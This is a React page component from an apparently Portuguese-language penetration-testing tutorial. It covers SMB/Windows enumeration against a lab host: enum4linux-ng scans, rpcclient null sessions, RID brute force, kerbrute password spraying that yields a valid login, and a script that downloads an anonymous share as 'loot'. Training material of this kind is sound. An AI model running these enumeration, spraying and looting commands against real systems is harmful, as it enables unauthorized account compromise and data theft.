import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Enum4linux() {
  return (
    <PageContainer
      title="enum4linux — Enumeração SMB/Windows"
      subtitle="Faz enumeração completa de hosts Windows/Samba: shares, usuários, grupos, password policy."
      difficulty="iniciante"
      timeToRead="10 min"
    >
      <h2>Setup</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y enum4linux enum4linux-ng smbclient",
            out: "(enum4linux clássico em Perl + versão -ng moderna em Python)",
            outType: "muted",
          },
          {
            cmd: "enum4linux-ng -h | head -10",
            out: `usage: enum4linux-ng [-h] [-A] [-As] [-U] [-G] [-Gm] [-S] [-P] [-O] [-L] [-I] [-R RANGES]
                     [-N] [-w DOMAIN] [-u USER] [-p PW] [-K NTHASH] [-d] [-k USERS] [-r DELAY]
                     [-s SHARES_FILE] [-t TIMEOUT] [-T TIMEOUT_RETRIES] [-v] [-oA YAML_FILE] [-oJ JSON_FILE]
                     host

enum4linux-ng - a next generation version of enum4linux`,
            outType: "info",
          },
        ]}
      />

      <h2>Scan completo (-A)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "enum4linux-ng -A 10.10.10.5",
            out: `ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.10.5
[*] Username ......... ''
[*] Random Username .. 'jvjjmyqx'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.10.5    |
 ====================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ====================================
|    NetBIOS Names and Workgroup    |
 ====================================
[+] Got domain/workgroup name: HACKTHEBOX
[+] Full NetBIOS names information:
- TARGET-DC      <00> -         B <ACTIVE>  Workstation Service
- HACKTHEBOX     <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- TARGET-DC      <20> -         B <ACTIVE>  File Server Service
- HACKTHEBOX     <1c> - <GROUP> B <ACTIVE>  Domain Controllers
- HACKTHEBOX     <1b> -         B <ACTIVE>  Domain Master Browser

 ===============================
|    SMB Dialect on 10.10.10.5    |
 ===============================
[+] Supported dialects:
    SMB 1.0: false
    SMB 2.02: true
    SMB 2.1: true
    SMB 3.0: true
    SMB 3.1.1: true
[+] Preferred dialect: SMB 3.1.1
[+] SMB signing required: true

 =====================================
|    Domain Information via SMB for 10.10.10.5    |
 =====================================
[+] Domain: HACKTHEBOX
[+] DNS Domain: hackthebox.local
[+] Forest: hackthebox.local
[+] FQDN server: TARGET-DC.hackthebox.local
[+] FQDN domain: hackthebox.local
[+] Member of a domain: yes

 ===========================
|    Sessions on 10.10.10.5    |
 ===========================
[+] Server allows session using username '', password ''
[+] Server allows session using username 'guest', password ''

 ========================
|    OS Information for 10.10.10.5    |
 ========================
[+] OS information via smbclient:
    OS=[Windows Server 2019 Standard 17763] Server=[Windows Server 2019 Standard 6.3]
[+] OS Version via SMB: 10.0
[+] OS Build via SMB: 17763

 =======================
|    Users via RPC on 10.10.10.5    |
 =======================
[+] Found 5 users via 'querydispinfo':
    Administrator (RID 500): Built-in account for administering the computer/domain
    Guest (RID 501): Built-in account for guest access
    krbtgt (RID 502): Key Distribution Center Service Account
    jsmith (RID 1108): John Smith (IT)
    msantos (RID 1109): Maria Santos (HR)

 ========================
|    Groups via RPC on 10.10.10.5    |
 ========================
[+] Local groups:
    Administrators (RID 544)
    Guests (RID 546)
    Print Operators (RID 550)
    Backup Operators (RID 551)
[+] Built-in groups:
    Domain Admins
    Domain Users
    Schema Admins
    Enterprise Admins
[+] Domain groups:
    IT Staff
    HR Department

 ========================
|    Shares via RPC on 10.10.10.5    |
 ========================
[+] Found 6 share(s):
    NETLOGON     Disk    Logon server share 
    SYSVOL       Disk    Logon server share 
    IPC$         IPC     Remote IPC
    Backup       Disk    Backup folder
    Public       Disk    Public folder (Anonymous READ access!)
    Users        Disk    

 ============================
|    Password Policy via RPC on 10.10.10.5    |
 ============================
[+] Password policy:
    Minimum password length: 7
    Password history length: 0
    Maximum password age: not set
    Password complexity flags: 0
    Account lockout threshold: None
    Account lockout duration: 30 minutes
    Reset account lockout after: 30 minutes`,
            outType: "success",
          },
        ]}
      />

      <CommandTable
        title="Flags do enum4linux-ng"
        variations={[
          { cmd: "-A", desc: "All — roda TUDO (recomendado em CTF/lab).", output: "Equivale a -USGPoLI." },
          { cmd: "-As", desc: "All sem brute (mais rápido e silencioso).", output: "Sem RID brute force." },
          { cmd: "-U", desc: "Lista usuários via RPC.", output: "rpcclient querydispinfo." },
          { cmd: "-G", desc: "Lista grupos.", output: "Locais + builtin + domain." },
          { cmd: "-S", desc: "Lista shares (SMB).", output: "Inclui anon access check." },
          { cmd: "-P", desc: "Password policy.", output: "Crítico para spraying." },
          { cmd: "-O", desc: "OS info.", output: "Versão exata Windows / Samba." },
          { cmd: "-L", desc: "LDAP info (se 389/tcp aberta).", output: "Pega DC info, naming context." },
          { cmd: "-R 500-1100", desc: "RID brute force range.", output: "Descobre usuários sem credenciais." },
          { cmd: "-u user -p pass", desc: "Auth (em vez de null session).", output: "Acessa muito mais info." },
          { cmd: "-K NTHASH", desc: "Pass-the-hash.", output: "Quando você só tem o NTLM hash." },
          { cmd: "-oA out.yaml", desc: "Output YAML.", output: "Estruturado para grep/jq." },
          { cmd: "-oJ out.json", desc: "Output JSON.", output: "Para automação." },
        ]}
      />

      <h2>Null session (auth anônima)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "muitos servidores Windows antigos aceitam conexão sem credenciais",
            cmd: "rpcclient -U \"\" -N 10.10.10.5",
            out: "rpcclient $> ",
            outType: "warning",
          },
          {
            cmd: "enumdomusers",
            out: `user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[jsmith] rid:[0x454]
user:[msantos] rid:[0x455]`,
            outType: "info",
          },
          {
            cmd: "enumdomgroups",
            out: `group:[IT Staff] rid:[0x4d3]
group:[HR Department] rid:[0x4d4]
group:[Backup Admins] rid:[0x4d5]`,
            outType: "default",
          },
          {
            cmd: "querygroupmem 0x4d3",
            out: `rid:[0x454] attr:[0x7]
rid:[0x456] attr:[0x7]`,
            outType: "default",
          },
          {
            cmd: "exit",
            out: "",
            outType: "muted",
          },
        ]}
      />

      <h2>Listando shares SMB</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "smbclient -L //10.10.10.5 -N",
            out: `        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backup          Disk      Backup folder
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      Public folder
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available`,
            outType: "success",
          },
          {
            comment: "conectar como anônimo no share Public",
            cmd: "smbclient //10.10.10.5/Public -N",
            out: `Try "help" to get a list of possible commands.
smb: \\>`,
            outType: "info",
          },
          {
            cmd: "ls",
            out: `  .                                   D        0  Mon Mar 11 18:23:01 2026
  ..                                  D        0  Mon Mar 11 18:23:01 2026
  README.txt                          A      142  Mon Mar 11 18:23:01 2026
  software                            D        0  Tue Mar 12 09:11:42 2026
  templates                           D        0  Tue Mar 12 09:11:42 2026

                15918560 blocks of size 4096. 8923471 blocks available`,
            outType: "default",
          },
          {
            cmd: "get README.txt",
            out: `getting file \\README.txt of size 142 as README.txt (45.2 KiloBytes/sec) (average 45.2 KiloBytes/sec)`,
            outType: "default",
          },
          {
            cmd: "exit",
            out: "",
            outType: "muted",
          },
          {
            cmd: "cat README.txt",
            out: `Bem-vindos ao share Público.

Para acesso ao Backup, contate jsmith@hackthebox.local
Default password reset = "Welcome2024!"`,
            outType: "warning",
          },
        ]}
      />

      <h2>RID brute force</h2>
      <p>
        Mesmo sem credenciais, você consegue descobrir SIDs de usuários por RID brute force.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "enum4linux-ng -R 500-1200 10.10.10.5",
            out: `[*] RID Brute force on 10.10.10.5

 [+] Found user: 'Administrator' (RID 500)
 [+] Found user: 'Guest' (RID 501)
 [+] Found user: 'krbtgt' (RID 502)
 [+] Found group: 'Domain Admins' (RID 512)
 [+] Found group: 'Domain Users' (RID 513)
 [+] Found user: 'jsmith' (RID 1108)
 [+] Found user: 'msantos' (RID 1109)
 [+] Found user: 'svc_backup' (RID 1110)  ← service account!
 [+] Found user: 'svc_sql' (RID 1111)
 [+] Found user: 'wallyson.test' (RID 1150)`,
            outType: "warning",
          },
        ]}
      />

      <h2>Password spraying baseado nas políticas</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "salvar usuários encontrados",
            cmd: "enum4linux-ng -U 10.10.10.5 -oJ enum.json && jq -r '.users.users | keys[]' enum.json > users.txt",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "cat users.txt",
            out: `Administrator
Guest
jsmith
msantos
svc_backup
svc_sql
wallyson.test`,
            outType: "default",
          },
          {
            comment: "spraying com kerbrute (1 senha em todos)",
            cmd: "kerbrute passwordspray -d hackthebox.local users.txt 'Welcome2024!' --dc 10.10.10.5",
            out: `2026/04/03 12:01:23 >  Using KDC(s):
2026/04/03 12:01:23 >       10.10.10.5:88

2026/04/03 12:01:24 >  [+] VALID LOGIN:	wallyson.test@hackthebox.local:Welcome2024!

2026/04/03 12:01:24 >  Done! Tested 7 logins (1 successes) in 0.421 seconds`,
            outType: "success",
          },
        ]}
      />

      <PracticeBox
        title="Enum SMB completo de um Windows lab"
        goal="A partir de um IP, listar usuários, grupos, shares, política de senha e tentar baixar conteúdo."
        steps={[
          "Confirme as portas 139/445 abertas com nmap.",
          "Rode enum4linux-ng -A.",
          "Liste shares com smbclient -L.",
          "Para cada share com 'Anonymous READ', conecte e baixe arquivos.",
          "Use os usuários encontrados em spraying com a política de senha exposta.",
        ]}
        command={`TARGET=10.10.10.5

nmap -p 139,445 -sV $TARGET
enum4linux-ng -A $TARGET -oJ enum.json
smbclient -L //$TARGET -N
jq -r '.users.users | keys[]' enum.json > users.txt

# baixar tudo do share Public se houver
mkdir loot && cd loot
smbclient //$TARGET/Public -N -c 'recurse ON; prompt OFF; mget *'`}
        expected={`PORT     STATE SERVICE     VERSION
139/tcp  open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2019 Standard

[+] Found 6 share(s):
    Public      Disk    (Anonymous READ access!)

(./loot/ vai conter README.txt, software/, templates/)`}
        verify="O JSON 'enum.json' deve ter campos populados em users, groups, shares e policy."
      />

      <AlertBox type="info" title="Use enum4linux-ng (next-gen) sempre que possível">
        O enum4linux clássico (Perl) ainda funciona, mas o <strong>enum4linux-ng</strong>{" "}
        é mais rápido, suporta Kerberos, NTLM hash, gera JSON/YAML estruturado.
        Mantenha o clássico só para alvos legados que quebram com o novo.
      </AlertBox>
    </PageContainer>
  );
}
